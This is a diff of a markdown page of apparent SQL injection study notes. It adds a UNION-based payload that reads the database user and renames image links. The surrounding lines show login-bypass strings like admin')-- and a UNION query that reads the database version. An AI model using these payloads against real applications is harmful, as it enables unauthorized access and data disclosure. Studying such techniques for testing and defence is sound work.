@@ -34,13 +34,13 @@ admin')--
 admin') -- -
 ```
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
 ```
 ') or id = 5 -- -
 ```
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### UNION Injection
 
@@ -66,3 +66,11 @@ cn' UNION select 1,@@version,3,4-- -
 ```
 
 <figure><img src="../../.gitbook/assets/db_version_1.jpg" alt=""><figcaption></figcaption></figure>
+
+#### Other Example
+
+```
+cn' union select 1,user(),3,4-- -
+```
+
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
